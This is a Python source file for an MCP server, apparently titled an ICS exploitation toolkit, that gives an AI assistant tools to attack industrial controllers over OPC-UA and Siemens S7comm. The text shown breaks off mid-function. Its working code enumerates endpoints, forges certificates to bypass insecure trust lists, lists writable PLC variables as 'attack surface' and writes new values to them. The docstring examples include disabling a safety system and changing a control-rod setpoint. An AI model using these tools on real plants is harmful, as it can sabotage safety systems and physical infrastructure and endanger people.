#!/usr/bin/env python3
"""
ICS Exploitation MCP - Unified Industrial Control Systems Security Toolkit

MCP (Model Context Protocol) server for ICS/SCADA security assessment.
Provides 56 tools across 5 industrial protocols:

- OPC-UA: Universal protocol for PLCs (Siemens, ABB, Rockwell, etc.)
- S7comm: Siemens S7 PLC communication (S7-300/400/1200/1500)
- BACnet: Building Automation and Control Networks (HVAC, access control)
- Modbus: Generic industrial protocol (water systems, power grids, sensors)
- EtherNet/IP: Allen-Bradley/Rockwell controllers (CIP protocol)

Usage (Cursor IDE):
    Add to .cursor/mcp.json:
    {
        "mcpServers": {
            "ics-exploitation": {
                "command": "python",
                "args": ["path/to/ics_exploitation_mcp.py"]
            }
        }
    }

Usage (Claude Desktop):
    Add to claude_desktop_config.json:
    {
        "mcpServers": {
            "ics-exploitation": {
                "command": "python",
                "args": ["path/to/ics_exploitation_mcp.py"]
            }
        }
    }

See README.md for complete documentation.

Author: ICS Security Research
Version: 1.2.0
License: MIT
"""

import asyncio
import os
import sys
import json
import logging
import datetime
import time
import random
import socket
import re
from pathlib import Path
from typing import Any, Dict, List, Optional, Union

# Detect if running as MCP server (stdin is not a TTY) or as library
_RUNNING_AS_MCP = not sys.stdin.isatty() if hasattr(sys.stdin, 'isatty') else False

# Setup logging - stderr for MCP mode, configurable for library mode
if _RUNNING_AS_MCP:
    logging.basicConfig(
        level=logging.ERROR,
        format='%(levelname)s: %(message)s',
        stream=sys.stderr
    )
else:
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )

logger = logging.getLogger(__name__)


# =============================================================================
# DEPENDENCY DETECTION
# =============================================================================

# OPC-UA dependencies
try:
    from opcua import Client, ua
    from opcua.crypto import security_policies
    OPCUA_AVAILABLE = True
except ImportError:
    OPCUA_AVAILABLE = False
    if not _RUNNING_AS_MCP:
        logger.warning("opcua library not installed. Install with: pip install opcua")

try:
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    if not _RUNNING_AS_MCP:
        logger.warning("cryptography library not installed. Install with: pip install cryptography")

# S7comm dependencies
try:
    import snap7
    SNAP7_AVAILABLE = True
except ImportError:
    SNAP7_AVAILABLE = False
    if not _RUNNING_AS_MCP:
        logger.warning("python-snap7 not installed. Install with: pip install python-snap7")

# HTTP requests for status monitoring
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# EtherNet/IP dependencies (pycomm3)
try:
    from pycomm3 import LogixDriver, CIPDriver
    from pycomm3.cip import Services
    PYCOMM3_AVAILABLE = True
except ImportError:
    PYCOMM3_AVAILABLE = False
    if not _RUNNING_AS_MCP:
        logger.warning("pycomm3 not installed. Install with: pip install pycomm3")


# =============================================================================
# OPC-UA TOOLKIT
# =============================================================================

class OPCUAToolkit:
    """
    OPC-UA Security Toolkit for ICS security assessment.
    
    Provides comprehensive OPC-UA protocol tools:
    - Endpoint enumeration to discover security requirements
    - Self-signed certificate generation for insecure trust list bypass
    - Secure connection handling with all security policies
    - Node enumeration with access level detection
    - Variable manipulation for PLC state changes
    
    Example:
        toolkit = OPCUAToolkit()
        
        # 1. Enumerate endpoints to find security requirements
        endpoints = toolkit.enumerate_endpoints("opc.tcp://target:4840")
        print(f"Security policies: {endpoints['security_policies']}")
        
        # 2. Generate certificates for secure connection
        certs = toolkit.generate_self_signed_cert("./certs")
        
        # 3. Connect with encryption
        toolkit.connect(
            url="opc.tcp://target:4840",
            cert_path=certs['cert_path'],
            key_path=certs['key_path'],
            security_policy="Basic256Sha256",
            security_mode="SignAndEncrypt"
        )
        
        # 4. Find attack surface
        writable = toolkit.find_writable_variables()
        for var in writable['variables']:
            print(f"{var['path']}: {var['value']} (writable)")
        
        # 5. Manipulate variables
        toolkit.write_variable("ns=2;i=1", "false", "Boolean")
        
        # 6. Cleanup
        toolkit.disconnect()
    """
    
    def __init__(self):
        """Initialize OPC-UA Toolkit"""
        self.name = "opcua-toolkit"
        self.version = "1.0.0"
        self.official_docs = "https://python-opcua.readthedocs.io/"
        
        # Connection state
        self._client: Optional[Any] = None
        self._connected = False
        self._current_url: Optional[str] = None
        
        # Certificate cache
        self._cert_path: Optional[str] = None
        self._key_path: Optional[str] = None
    
    # =========================================================================
    # SECURITY AND CONNECTION TOOLS
    # =========================================================================
    
    def enumerate_endpoints(self, url: str) -> Dict[str, Any]:
        """
        Enumerate OPC-UA server endpoints to discover security requirements.
        
        This is typically the first step in OPC-UA security assessment.
        It reveals what security policies the server supports and helps
        identify potential vulnerabilities like accepting "None" security
        or having an insecure trust list.
        
        Args:
            url: OPC-UA server URL (e.g., "opc.tcp://192.168.1.100:4840")
        
        Returns:
            Dictionary containing:
            - url: The target URL
            - endpoint_count: Number of endpoints found
            - endpoints: List of endpoint details (security policy, mode, tokens)
            - security_policies: Unique list of supported policies
            - recommendation: Suggested next steps based on security config
        
        Example:
            result = toolkit.enumerate_endpoints("opc.tcp://plc.local:4840")
            if "None" in result['security_policies']:
                print("WARNING: Server accepts unencrypted connections!")
        """
        if not OPCUA_AVAILABLE:
            return {"error": "opcua library not installed", "install": "pip install opcua"}
        
        try:
            client = Client(url)
            endpoints = client.connect_and_get_server_endpoints()
            
            result = {
                "url": url,
                "endpoint_count": len(endpoints),
                "endpoints": [],
                "security_policies": [],
                "recommendation": None
            }
            
            policies_set = set()
            for i, ep in enumerate(endpoints):
                policy_uri = ep.SecurityPolicyUri
                policy_name = policy_uri.split("#")[-1] if "#" in policy_uri else policy_uri
                
                mode_map = {1: "None", 2: "Sign", 3: "SignAndEncrypt"}
                mode_name = mode_map.get(ep.SecurityMode, f"Unknown({ep.SecurityMode})")
                
                tokens = []
                for token in ep.UserIdentityTokens:
                    token_type_map = {0: "Anonymous", 1: "UserName", 2: "Certificate", 3: "IssuedToken"}
                    tokens.append(token_type_map.get(token.TokenType, f"Unknown({token.TokenType})"))
                
                endpoint_info = {
                    "index": i,
                    "security_policy": policy_name,
                    "security_mode": mode_name,
                    "user_tokens": tokens,
                    "endpoint_url": str(ep.EndpointUrl)
                }
                
                result["endpoints"].append(endpoint_info)
                policies_set.add(policy_name)
            
            result["security_policies"] = list(policies_set)
            
            # Provide actionable recommendations
            if "None" in policies_set:
                result["recommendation"] = "Server accepts 'None' security - use anonymous connection"
            elif any(p in policies_set for p in ["Basic256Sha256", "Basic256", "Basic128Rsa15"]):
                result["recommendation"] = "Server requires encryption - generate self-signed certificate and try insecure trust list bypass"
            else:
                result["recommendation"] = "Unknown security policy - manual investigation needed"
            
            return result
        
        except Exception as e:
            return {"error": str(e), "url": url, "hint": "Check if target is reachable and OPC-UA port is correct"}
    
    def generate_self_signed_cert(self, output_dir: str = ".", common_name: str = "OPCUAClient", 
                                   validity_days: int = 365) -> Dict[str, Any]:
        """
        Generate a self-signed X.509 certificate for OPC-UA authentication.
        
        Many OPC-UA servers have "insecure trust lists" - they accept ANY
        client certificate without validation. This allows authentication
        bypass by generating our own certificate.
        
        Args:
            output_dir: Directory to save certificate files (default: current dir)
            common_name: CN field for the certificate (default: "OPCUAClient")
            validity_days: Certificate validity in days (default: 365)
        
        Returns:
            Dictionary containing:
            - success: Boolean indicating success
            - cert_path: Absolute path to generated certificate (.pem)
            - key_path: Absolute path to generated private key (.pem)
            - thumbprint: SHA1 thumbprint of the certificate
        
        Example:
            certs = toolkit.generate_self_signed_cert("./my_certs", "AttackerClient")
            print(f"Certificate: {certs['cert_path']}")
            print(f"Thumbprint: {certs['thumbprint']}")
        """
        if not CRYPTO_AVAILABLE:
            return {"error": "cryptography library not installed", "install": "pip install cryptography"}
        
        try:
            output_path = Path(output_dir)
            output_path.mkdir(parents=True, exist_ok=True)
            
            # Generate RSA key pair
            private_key = rsa.generate_private_key(
                public_exponent=65537, key_size=2048, backend=default_backend()
            )
            
            # Build certificate
            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, u"US"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"OPCClient"),
                x509.NameAttribute(NameOID.COMMON_NAME, common_name),
            ])
            
            cert = x509.CertificateBuilder().subject_name(subject).issuer_name(issuer).public_key(
                private_key.public_key()
            ).serial_number(x509.random_serial_number()).not_valid_before(
                datetime.datetime.utcnow()
            ).not_valid_after(
                datetime.datetime.utcnow() + datetime.timedelta(days=validity_days)
            ).add_extension(
                x509.SubjectAlternativeName([x509.UniformResourceIdentifier(u"urn:opcua:client")]),
                critical=False
            ).add_extension(
                x509.BasicConstraints(ca=False, path_length=None), critical=True
            ).sign(private_key, hashes.SHA256(), default_backend())
            
            # Save certificate
            cert_path = output_path / "client_cert.pem"
            with open(cert_path, "wb") as f:
                f.write(cert.public_bytes(serialization.Encoding.PEM))
            
            # Save private key (unencrypted for OPC-UA compatibility)
            key_path = output_path / "client_key.pem"
            with open(key_path, "wb") as f:
                f.write(private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                    encryption_algorithm=serialization.NoEncryption()
                ))
            
            # Calculate thumbprint
            thumbprint = cert.fingerprint(hashes.SHA1()).hex().upper()
            
            # Cache paths for convenience
            self._cert_path = str(cert_path)
            self._key_path = str(key_path)
            
            return {
                "success": True,
                "cert_path": str(cert_path.absolute()),
                "key_path": str(key_path.absolute()),
                "thumbprint": thumbprint,
                "note": "Use these certificates with connect() for insecure trust list bypass"
            }
        except Exception as e:
            return {"error": str(e)}
    
    def connect(self, url: str, cert_path: Optional[str] = None, key_path: Optional[str] = None,
                security_policy: str = "None", security_mode: str = "None") -> Dict[str, Any]:
        """
        Connect to OPC-UA server with specified security settings.
        
        Supports all standard OPC-UA security policies and modes.
        For servers requiring encryption, use certificates generated by
        generate_self_signed_cert().
        
        Args:
            url: OPC-UA server URL (e.g., "opc.tcp://192.168.1.100:4840")
            cert_path: Path to client certificate (required for encrypted connections)
            key_path: Path to client private key (required for encrypted connections)
            security_policy: One of "None", "Basic128Rsa15", "Basic256", "Basic256Sha256"
            security_mode: One of "None", "Sign", "SignAndEncrypt"
        
        Returns:
            Dictionary with connection status and details
        
        Example:
            # Unencrypted connection
            toolkit.connect("opc.tcp://target:4840")
            
            # Encrypted connection with self-signed cert
            toolkit.connect(
                "opc.tcp://target:4840",
                cert_path="./certs/client_cert.pem",
                key_path="./certs/client_key.pem",
                security_policy="Basic256Sha256",
                security_mode="SignAndEncrypt"
            )
        """
        if not OPCUA_AVAILABLE:
            return {"error": "opcua library not installed"}
        
        # Disconnect existing connection
        if self._connected:
            self.disconnect()
        
        try:
            self._client = Client(url)
            
            if security_policy != "None":
                policy_map = {
                    "Basic128Rsa15": security_policies.SecurityPolicyBasic128Rsa15,
                    "Basic256": security_policies.SecurityPolicyBasic256,
                    "Basic256Sha256": security_policies.SecurityPolicyBasic256Sha256,
                }
                mode_map = {
                    "None": ua.MessageSecurityMode.None_,
                    "Sign": ua.MessageSecurityMode.Sign,
                    "SignAndEncrypt": ua.MessageSecurityMode.SignAndEncrypt,
                }
                
                if security_policy not in policy_map:
                    return {"error": f"Unknown security policy: {security_policy}. Valid: {list(policy_map.keys())}"}
                if security_mode not in mode_map:
                    return {"error": f"Unknown security mode: {security_mode}. Valid: {list(mode_map.keys())}"}
                
                # Use provided paths or cached paths from generate_self_signed_cert
                cert = cert_path or self._cert_path
                key = key_path or self._key_path
                
                if not cert or not key:
                    return {"error": "Certificate and key required for secure connection. Use generate_self_signed_cert() first."}
                
                self._client.set_security(
                    policy_map[security_policy], cert, key, None,
                    mode=mode_map[security_mode]
                )
            
            self._client.connect()
            self._connected = True
            self._current_url = url
            
            return {
                "success": True,
                "url": url,
                "security_policy": security_policy,
                "security_mode": security_mode,
                "note": "Connection established. Use enumerate_nodes() or find_writable_variables() next."
            }
        except Exception as e:
            self._connected = False
            self._client = None
            return {"error": str(e), "url": url, "hint": "Check security settings match server requirements"}
    
    def disconnect(self) -> Dict[str, Any]:
        """
        Disconnect from OPC-UA server.
        
        Returns:
            Dictionary with disconnection status
        """
        if not self._connected or not self._client:
            return {"success": True, "note": "No active connection"}
        
        try:
            self._client.disconnect()
            self._connected = False
            url = self._current_url
            self._current_url = None
            self._client = None
            return {"success": True, "url": url, "note": "Disconnected successfully"}
        except Exception as e:
            return {"error": str(e)}
    
    # =========================================================================
    # NODE ENUMERATION TOOLS
    # =========================================================================
    
    def enumerate_nodes(self, max_depth: int = 5, start_node: Optional[str] = None) -> Dict[str, Any]:
        """
        Enumerate OPC-UA node hierarchy with access level detection.
        
        Recursively browses the OPC-UA address space to discover all nodes.
        For variables, extracts access levels to identify writable nodes
        (potential attack surface).
        
        Access Level Bits:
        - Bit 0 (0x01): CurrentRead - Can read current value
        - Bit 1 (0x02): CurrentWrite - Can write current value (ATTACK SURFACE)
        - Bit 2 (0x04): HistoryRead - Can read history
        - Bit 3 (0x08): HistoryWrite - Can write history
        
        Args:
            max_depth: Maximum recursion depth (default: 5)
            start_node: Starting node ID (default: Objects folder)
        
        Returns:
            Dictionary containing:
            - total_count: Total nodes found
            - writable_count: Number of writable variables
            - nodes: List of node details
        
        Example:
            result = toolkit.enumerate_nodes(max_depth=6)
            for node in result['nodes']:
                if node.get('writable'):
                    print(f"WRITABLE: {node['path']} = {node['value']}")
        """
        if not self._connected or not self._client:
            return {"error": "Not connected", "hint": "Use connect() first"}
        
        try:
            root = self._client.get_node(start_node) if start_node else self._client.get_objects_node()
            nodes = []
            writable_count = 0
            
            def enumerate_recursive(node, depth, path=""):
                nonlocal writable_count
                if depth > max_depth:
                    return
                
                try:
                    browse_name = node.get_browse_name()
                    node_class = node.get_node_class()
                    node_id = node.nodeid.to_string()
                    display_name = str(browse_name.Name)
                    current_path = f"{path}/{display_name}" if path else display_name
                    
                    node_info = {
                        "node_id": node_id,
                        "browse_name": display_name,
                        "path": current_path,
                        "node_class": str(node_class).split(".")[-1],
                        "depth": depth
                    }
                    
                    # Extract variable-specific info
                    if node_class == ua.NodeClass.Variable:
                        try:
                            value = node.get_value()
                            node_info["value"] = str(value) if value is not None else None
                        except:
                            node_info["value"] = "[unreadable]"
                        
                        # Check access level for write capability
                        try:
                            access_attr = node.get_attribute(ua.AttributeIds.AccessLevel)
                            access_level = access_attr.Value.Value
                            writable = bool(access_level & 0x02)  # Bit 1 = CurrentWrite
                            node_info["access_level"] = access_level
                            node_info["writable"] = writable
                            if writable:
                                writable_count += 1
                        except:
                            node_info["access_level"] = "unknown"
                        
                        # Get data type for write operations
                        try:
                            data_type = node.get_data_type_as_variant_type()
                            node_info["data_type"] = str(data_type).split(".")[-1]
                        except:
                            node_info["data_type"] = "unknown"
                    
                    nodes.append(node_info)
                    
                    # Recurse into children
                    try:
                        for child in node.get_children():
                            enumerate_recursive(child, depth + 1, current_path)
                    except:
                        pass
                except:
                    pass
            
            enumerate_recursive(root, 0)
            
            return {
                "success": True,
                "total_count": len(nodes),
                "writable_count": writable_count,
                "nodes": nodes
            }
        except Exception as e:
            return {"error": str(e)}
    
    def find_writable_variables(self, max_depth: int = 5) -> Dict[str, Any]:
        """
        Find all writable variables in the OPC-UA address space.
        
        This is a convenience wrapper around enumerate_nodes() that filters
        to only show writable variables - the primary attack surface for
        ICS exploitation.
        
        Args:
            max_depth: Maximum recursion depth (default: 5)
        
        Returns:
            Dictionary containing:
            - count: Number of writable variables
            - variables: List of writable variable details
            - attack_notes: Formatted summary for exploitation planning
        
        Example:
            writable = toolkit.find_writable_variables()
            print(f"Found {writable['count']} writable variables:")
            print(writable['attack_notes'])
        """
        result = self.enumerate_nodes(max_depth=max_depth)
        if "error" in result:
            return result
        
        writable_vars = [n for n in result["nodes"] if n.get("writable", False)]
        
        # Generate attack notes
        attack_notes = []
        for var in writable_vars:
            note = f"- {var['path']} ({var.get('data_type', 'unknown')}): Currently = {var.get('value', '?')}"
            attack_notes.append(note)
        
        return {
            "success": True,
            "count": len(writable_vars),
            "variables": writable_vars,
            "attack_notes": "\n".join(attack_notes) if attack_notes else "No writable variables found"
        }
    
    def get_node_info(self, node_id: str) -> Dict[str, Any]:
        """
        Get detailed information about a specific node.
        
        Args:
            node_id: OPC-UA node ID (e.g., "ns=2;i=1" or "i=2294")
        
        Returns:
            Dictionary with node details
        """
        if not self._connected or not self._client:
            return {"error": "Not connected"}
        
        try:
            node = self._client.get_node(node_id)
            
            info = {
                "node_id": node_id,
                "browse_name": str(node.get_browse_name().Name),
                "node_class": str(node.get_node_class()).split(".")[-1],
            }
            
            # Try to get variable-specific attributes
            try:
                info["value"] = str(node.get_value())
            except:
                pass
            
            try:
                access = node.get_attribute(ua.AttributeIds.AccessLevel).Value.Value
                info["access_level"] = access
                info["readable"] = bool(access & 0x01)
                info["writable"] = bool(access & 0x02)
            except:
                pass
            
            try:
                info["data_type"] = str(node.get_data_type_as_variant_type()).split(".")[-1]
            except:
                pass
            
            return {"success": True, **info}
        except Exception as e:
            return {"error": str(e), "node_id": node_id}
    
    # =========================================================================
    # VARIABLE MANIPULATION TOOLS
    # =========================================================================
    
    def read_variable(self, node_id: str) -> Dict[str, Any]:
        """
        Read a variable's current value.
        
        Args:
            node_id: OPC-UA node ID (e.g., "ns=2;i=1")
        
        Returns:
            Dictionary with node_id, value, and value_str
        
        Example:
            result = toolkit.read_variable("ns=2;i=11")
            print(f"Control rod position: {result['value']}%")
        """
        if not self._connected or not self._client:
            return {"error": "Not connected"}
        
        try:
            node = self._client.get_node(node_id)
            value = node.get_value()
            return {"success": True, "node_id": node_id, "value": value, "value_str": str(value)}
        except Exception as e:
            return {"error": str(e), "node_id": node_id}
    
    def write_variable(self, node_id: str, value: Any, data_type: str = "auto") -> Dict[str, Any]:
        """
        Write a value to a variable.
        
        Automatically converts the value to the correct OPC-UA data type.
        Use this to manipulate PLC variables for ICS exploitation.
        
        Args:
            node_id: OPC-UA node ID (e.g., "ns=2;i=1")
            value: Value to write (will be type-converted)
            data_type: Data type hint - "auto" to detect, or explicit type:
                      "Boolean", "Int16", "Int32", "UInt16", "UInt32",
                      "Float", "Double", "String"
        
        Returns:
            Dictionary with old_value, new_value, and written_value
        
        Example:
            # Disable a safety system (Boolean)
            toolkit.write_variable("ns=2;i=38", "false", "Boolean")
            
            # Change a setpoint (Double)
            toolkit.write_variable("ns=2;i=11", "0.0", "Double")
        """
        if not self._connected or not self._client:
            return {"error": "Not connected"}
        
        try:
            node = self._client.get_node(node_id)
            
            # Get old value for logging
            try:
                old_value = node.get_value()
            except:
                old_value = "[unreadable]"
            
            # Determine data type
            if data_type == "auto":
                variant_type = node.get_data_type_as_variant_type()
            else:
                type_map = {
                    "Boolean": ua.VariantType.Boolean, "Bool": ua.VariantType.Boolean,
                    "Int16": ua.VariantType.Int16, "Int32": ua.VariantType.Int32,
                    "UInt16": ua.VariantType.UInt16, "UInt32": ua.VariantType.UInt32,
                    "Float": ua.VariantType.Float, "Double": ua.VariantType.Double,
                    "String": ua.VariantType.String,
                }
                if data_type not in type_map:
                    return {"error": f"Unknown data type: {data_type}. Valid: {list(type_map.keys())}"}
                variant_type = type_map[data_type]
            
            # Convert value to correct type
            if variant_type == ua.VariantType.Boolean:
                if isinstance(value, str):
                    typed_value = value.lower() in ("true", "1", "yes", "on")
                else:
                    typed_value = bool(value)
            elif variant_type in (ua.VariantType.Float, ua.VariantType.Double):
                typed_value = float(value)
            elif variant_type in (ua.VariantType.Int16, ua.VariantType.Int32, 
                                  ua.VariantType.UInt16, ua.VariantType.UInt32):
                typed_value = int(value)
            else:
                typed_value = value
            
            # Write value
            data_value = ua.DataValue(ua.Variant(typed_value, variant_type))
            node.set_value(data_value)
            
            # Verify write
            try:
                new_value = node.get_value()
            except:
                new_value = "[unreadable]"
            
            return {
                "success": True,
                "node_id": node_id,
                "old_value": str(old_value),
                "new_value": str(new_value),
                "written_value": str(typed_value)
            }
        except Exception as e:
            return {"error": str(e), "node_id": node_id}
    
    # =========================================================================
    # UTILITY METHODS
    # =========================================================================
    
    def check_installation(self) -> Dict[str, Any]:
        """
        Check if required dependencies are installed.
        
        Returns:
            Dictionary with installation status for each dependency
        """
        return {
            "protocol": "OPC-UA",
            "version": self.version,
            "dependencies": {
                "opcua": {"installed": OPCUA_AVAILABLE, "install": "pip install opcua"},
                "cryptography": {"installed": CRYPTO_AVAILABLE, "install": "pip install cryptography"}
            },
            "ready": OPCUA_AVAILABLE and CRYPTO_AVAILABLE,
            "connected": self._connected,
            "url": self._current_url
        }
    
    def list_capabilities(self) -> Dict[str, Any]:
        """
        List all tools provided by this toolkit.
        
        Returns:
            Dictionary with tool names and descriptions
        """
        return {
            "protocol": "OPC-UA",
            "version": self.version,
            "tools": [
                {"name": "enumerate_endpoints", "description": "Discover OPC-UA server security requirements"},
                {"name": "generate_self_signed_cert", "description": "Generate certificate for trust list bypass"},
                {"name": "connect", "description": "Connect to OPC-UA server with security settings"},
                {"name": "disconnect", "description": "Disconnect from server"},
                {"name": "enumerate_nodes", "description": "List all nodes with access levels"},
                {"name": "find_writable_variables", "description": "Find writable variables (attack surface)"},
                {"name": "get_node_info", "description": "Get detailed info about a specific node"},
                {"name": "read_variable", "description": "Read variable value"},
                {"name": "write_variable", "description": "Write value to variable"},
                {"name": "check_installation", "description": "Check dependencies"},
                {"name": "list_capabilities", "description": "List all toolkit tools"},
            ]
        }
    
    @property
    def is_connected(self) -> bool:
        """Check if currently connected to a server."""
        return self._connected
    
    @property
    def current_url(self) -> Optional[str]:
        """Get the URL of the currently connected server."""
        return self._current_url


# =============================================================================
# SNAP7 (S7COMM) TOOLKIT
# =============================================================================

class Snap7Toolkit:
    """
    Siemens S7 PLC Toolkit for ICS security assessment.
    
    Provides comprehensive S7comm protocol tools:
    - Connection management with non-standard port support
    - Data block read/write operations
    - CPU and block enumeration
    - Attack tools for sustained writes and memory scanning
    
    Example:
        toolkit = Snap7Toolkit()
        
        # Connect to PLC
        toolkit.connect("192.168.1.1", rack=0, slot=0, port=102)
        
        # Read data block
        data = toolkit.db_read(db_number=1, offset=0, size=100)
        print(f"Data: {data['data_hex']}")
        
        # Write to data block
        toolkit.db_write(db_number=1, offset=0, data="FF00FF00")
        
        # Disconnect
        toolkit.disconnect()
    """
    
    def __init__(self):
        """Initialize Snap7 Toolkit"""
        self.name = "snap7-toolkit"
        self.version = "1.0.0"
        self.official_docs = "https://python-snap7.readthedocs.io/"
        self.category = "ics"
        
        # Connection state
        self._client = None
        self._connection_info = {}
    
    # =========================================================================
    # CONNECTION MANAGEMENT
    # =========================================================================
    
    def connect(self, ip: str, rack: int = 0, slot: int = 0, 
                port: int = 102) -> Dict[str, Any]:
        """
        Connect to Siemens S7 PLC.
        
        Args:
            ip: Target IP address
            rack: PLC rack number (usually 0)
            slot: PLC slot number (0 for S7-300, 1 for S7-400)
            port: TCP port (102 standard, some systems use non-standard ports)
        
        Returns:
            Connection result with status
        """
        if not SNAP7_AVAILABLE:
            return {
                "success": False,
                "error": "python-snap7 not installed",
                "hint": "pip install python-snap7"
            }
        
        # Disconnect existing connection
        if self._client and self._client.get_connected():
            self._client.disconnect()
        
        try:
            self._client = snap7.client.Client()
            self._client.connect(ip, rack, slot, port)
            
            connected = self._client.get_connected()
            
            self._connection_info = {
                "ip": ip,
                "rack": rack,
                "slot": slot,
                "port": port
            }
            
            result = {
                "success": connected,
                "connected": connected,
                "connection_info": self._connection_info
            }
            
            # Try to get CPU info on successful connect
            if connected:
                try:
                    cpu_info = self._client.get_cpu_info()
                    result["cpu_type"] = cpu_info.ModuleTypeName.decode('utf-8').strip()
                    result["serial_number"] = cpu_info.SerialNumber.decode('utf-8').strip()
                except Exception:
                    pass
            
            return result
            
        except Exception as e:
            error_msg = str(e)
            return {
                "success": False,
                "error": error_msg,
                "connection_info": {
                    "ip": ip,
                    "rack": rack,
                    "slot": slot,
                    "port": port
                },
                "hints": [
                    "Check if target is reachable",
                    "Verify port is correct (some systems use non-standard ports)",
                    "Try different rack/slot combinations",
                    "Common error 'TCP : Unreachable peer' = wrong IP/port"
                ]
            }
    
    def disconnect(self) -> Dict[str, Any]:
        """Disconnect from PLC"""
        if not self._client:
            return {"success": True, "message": "No active connection"}
        
        try:
            if self._client.get_connected():
                self._client.disconnect()
            
            self._client = None
            self._connection_info = {}
            
            return {"success": True, "message": "Disconnected"}
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def is_connected(self) -> Dict[str, Any]:
        """Check if connected to PLC"""
        if not self._client:
            return {"connected": False, "connection_info": None}
        
        try:
            connected = self._client.get_connected()
            return {
                "connected": connected,
                "connection_info": self._connection_info if connected else None
            }
        except Exception as e:
            return {"connected": False, "error": str(e)}
    
    # =========================================================================
    # PLC INFORMATION
    # =========================================================================
    
    def get_cpu_info(self) -> Dict[str, Any]:
        """Get CPU module information"""
        if not self._client or not self._client.get_connected():
            return {"success": False, "error": "Not connected"}
        
        try:
            cpu_info = self._client.get_cpu_info()
            
            return {
                "success": True,
                "module_type": cpu_info.ModuleTypeName.decode('utf-8').strip(),
                "serial_number": cpu_info.SerialNumber.decode('utf-8').strip(),
                "as_name": cpu_info.ASName.decode('utf-8').strip() if cpu_info.ASName else "",
                "copyright": cpu_info.Copyright.decode('utf-8').strip() if cpu_info.Copyright else "",
                "module_name": cpu_info.ModuleName.decode('utf-8').strip() if cpu_info.ModuleName else ""
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def get_cpu_state(self) -> Dict[str, Any]:
        """Get CPU run state"""
        if not self._client or not self._client.get_connected():
            return {"success": False, "error": "Not connected"}
        
        try:
            state = self._client.get_cpu_state()
            
            state_names = {
                0: "Unknown",
                4: "Stop",
                8: "Run"
            }
            
            return {
                "success": True,
                "state_code": state,
                "state_name": state_names.get(state, f"Unknown ({state})")
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def list_blocks(self) -> Dict[str, Any]:
        """List all data blocks on PLC"""
        if not self._client or not self._client.get_connected():
            return {"success": False, "error": "Not connected"}
        
        try:
            # Get block list
            blocks_list = self._client.list_blocks()
            
            result = {
                "success": True,
                "blocks": {
                    "OB": blocks_list.OBCount,  # Organization blocks
                    "FB": blocks_list.FBCount,  # Function blocks
                    "FC": blocks_list.FCCount,  # Functions
                    "SFB": blocks_list.SFBCount,  # System function blocks
                    "SFC": blocks_list.SFCCount,  # System functions
                    "DB": blocks_list.DBCount,  # Data blocks
                    "SDB": blocks_list.SDBCount  # System data blocks
                }
            }
            
            # Try to enumerate DB numbers
            if blocks_list.DBCount > 0:
                try:
                    db_list = self._client.list_blocks_of_type(0x41, 100)  # 0x41 = DB
                    result["db_numbers"] = list(db_list)
                except Exception:
                    result["db_numbers"] = "Could not enumerate"
            
            return result
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    # =========================================================================
    # DATA BLOCK OPERATIONS
    # =========================================================================
    
    def db_read(self, db_number: int, offset: int = 0, 
                size: int = 100) -> Dict[str, Any]:
        """
        Read data from a data block.
        
        Args:
            db_number: Data block number (e.g., 1 for DB1)
            offset: Byte offset to start reading from
            size: Number of bytes to read
        
        Returns:
            Read data as hex string and bytes
        """
        if not self._client or not self._client.get_connected():
            return {"success": False, "error": "Not connected"}
        
        try:
            data = self._client.db_read(db_number, offset, size)
            
            # Convert to hex string for easy display
            hex_str = data.hex().upper()
            
            # Find non-zero ranges for quick analysis
            non_zero = []
            for i, b in enumerate(data):
                if b != 0:
                    non_zero.append({"offset": offset + i, "value": f"0x{b:02X}"})
            
            return {
                "success": True,
                "db_number": db_number,
                "offset": offset,
                "size": len(data),
                "data_hex": hex_str,
                "data_bytes": list(data),
                "non_zero_bytes": non_zero[:50],  # Limit to first 50
                "non_zero_count": len(non_zero)
            }
            
        except Exception as e:
            error_msg = str(e)
            hints = []
            
            if "Address out of range" in error_msg or "Item not available" in error_msg:
                hints.append("Try smaller size or different offset")
                hints.append("Use db_get_size() to check block size")
                hints.append("Use list_blocks() to verify DB exists")
            
            return {
                "success": False, 
                "error": error_msg,
                "db_number": db_number,
                "offset": offset,
                "size": size,
                "hints": hints
            }
    
    def db_write(self, db_number: int, offset: int, 
                 data: Union[str, bytes, bytearray, List[int]]) -> Dict[str, Any]:
        """
        Write data to a data block.
        
        Args:
            db_number: Data block number (e.g., 1 for DB1)
            offset: Byte offset to start writing at
            data: Data to write - can be:
                  - Hex string: "FF00FF00"
                  - Bytes: b'\\xff\\x00\\xff\\x00'
                  - List of ints: [255, 0, 255, 0]
        
        Returns:
            Write result with bytes written
        """
        if not self._client or not self._client.get_connected():
            return {"success": False, "error": "Not connected"}
        
        # Convert data to bytes
        try:
            if isinstance(data, str):
                # Hex string
                data = bytes.fromhex(data.replace(" ", ""))
            elif isinstance(data, list):
                # List of ints
                data = bytes(data)
            elif isinstance(data, bytearray):
                data = bytes(data)
            # else assume it's already bytes
        except Exception as e:
            return {
                "success": False,
                "error": f"Invalid data format: {e}",
                "hint": "Use hex string like 'FF00' or list like [255, 0]"
            }
        
        try:
            self._client.db_write(db_number, offset, data)
            
            return {
                "success": True,
                "db_number": db_number,
                "offset": offset,
                "bytes_written": len(data),
                "data_hex": data.hex().upper()
            }
            
        except Exception as e:
            error_msg = str(e)
            hints = []
            
            if "Address out of range" in error_msg:
                hints.append("Offset + data length may exceed block size")
                hints.append("Use db_get_size() to check block size")
            
            return {
                "success": False,
                "error": error_msg,
                "db_number": db_number,
                "offset": offset,
                "data_size": len(data),
                "hints": hints
            }
    
    def db_get_size(self, db_number: int) -> Dict[str, Any]:
        """
        Get the size of a data block.
        
        Args:
            db_number: Data block number
        
        Returns:
